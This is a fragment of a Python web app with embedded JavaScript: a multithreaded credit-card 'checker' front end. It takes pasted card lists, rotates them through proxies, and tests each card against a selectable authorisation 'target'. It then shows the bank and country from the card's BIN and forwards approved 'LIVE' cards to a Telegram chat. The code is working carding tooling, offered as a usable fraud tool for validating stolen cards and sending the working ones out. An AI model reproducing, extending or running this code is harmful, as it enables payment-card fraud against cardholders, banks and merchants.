            await fetch(`/api/telegram/send?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chatId)}&message=${encodeURIComponent(text)}`);
        } catch (e) {}
    }

    async function runBatchChecker() {
        const btn = document.getElementById("checkButton");
        const pauseBtn = document.getElementById("pauseButton");
        const stopBtn = document.getElementById("stopButton");
        const liveBox = document.getElementById("liveBox");
        const deadBox = document.getElementById("deadBox");
        const bar = document.getElementById("progressBar");
        const target = document.getElementById("targetSelect").value;
        const maxThreads = parseInt(document.getElementById("cardThreads").value) || 5;

        const tgToken = document.getElementById("tgToken").value.trim();
        const tgChatId = document.getElementById("tgChatId").value.trim();

        const cards = document.getElementById("cardInput").value.split("\\n").map(l => l.trim()).filter(Boolean);
        const proxies = document.getElementById("proxyInput").value.split(/[\\n,]/).map(l => l.trim()).filter(Boolean);
        if (!cards.length) return alert("Paste cards first.");

        btn.disabled = true;
        pauseBtn.disabled = false;
        stopBtn.disabled = false;
        isStopped = false;
        isPaused = false;

        let live = 0, dead = 0, checked = 0;
        document.getElementById("liveCount").textContent = "0";
        document.getElementById("deadCount").textContent = "0";
        document.getElementById("checkedCount").textContent = "0";
        liveBox.innerHTML = "";
        deadBox.innerHTML = "";
        bar.style.width = "0%";

        const pairs = cards.map((c, i) => ({
            card: c,
            proxy: proxies.length ? proxies[i % proxies.length] : ""
        }));

        let idx = 0;
        const total = pairs.length;

        async function cardWorker() {
            while (idx < total && !isStopped) {
                while (isPaused && !isStopped) {
                    await new Promise(r => setTimeout(r, 500));
                }
                if (isStopped) break;

                const pair = pairs[idx++];
                try {
                    let url = `/api/auth/check?card=${encodeURIComponent(pair.card)}&target=${encodeURIComponent(target)}`;
                    if (pair.proxy) url += `&proxy=${encodeURIComponent(pair.proxy)}`;
                    const resp = await fetch(url);
                    const d = await resp.json();

                    checked++;
                    document.getElementById("checkedCount").textContent = String(checked);
                    bar.style.width = Math.round((checked / total) * 100) + "%";

                    const bank = d.bin_info?.bank ? `${d.bin_info.bank} (${d.bin_info.country})` : "BIN";
                    const gate = d.target_used ? ` [${d.target_used}]` : "";
                    const line = `[${d.status}] ${pair.card} -> ${d.reason}${gate} | ${bank} (${d.latency_ms}ms)`;

                    const row = document.createElement("div");
                    row.textContent = line;

                    if (d.status === "LIVE") {
                        live++;
                        document.getElementById("liveCount").textContent = String(live);
                        liveBox.appendChild(row);
                        playTone('live');
                        if (tgToken && tgChatId) {
                            sendTelegram(tgToken, tgChatId, `🔥 REAL AUTH APPROVED (LIVE) 🔥\\n${line}`);
                        }
                    } else {
                        dead++;
                        document.getElementById("deadCount").textContent = String(dead);
                        deadBox.appendChild(row);
                        playTone('dead');
                    }
                } catch (err) {
                    checked++;
                    dead++;
                    document.getElementById("checkedCount").textContent = String(checked);
                    document.getElementById("deadCount").textContent = String(dead);
                    const row = document.createElement("div");
                    row.textContent = `[ERROR] ${pair.card} -> ${err.message}`;
                    deadBox.appendChild(row);
                }
            }
        }

        const workers = Math.min(maxThreads, total);
        btn.textContent = `Running Real Auth (${workers} threads)...`;
        await Promise.all(Array.from({ length: workers }, () => cardWorker()));

        stopChecker();
        bar.style.width = "100%";
    }
    </script>
</body>
</html>"""


if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="0.0.0.0", port=int(os.getenv("PORT", 8000)), reload=False)
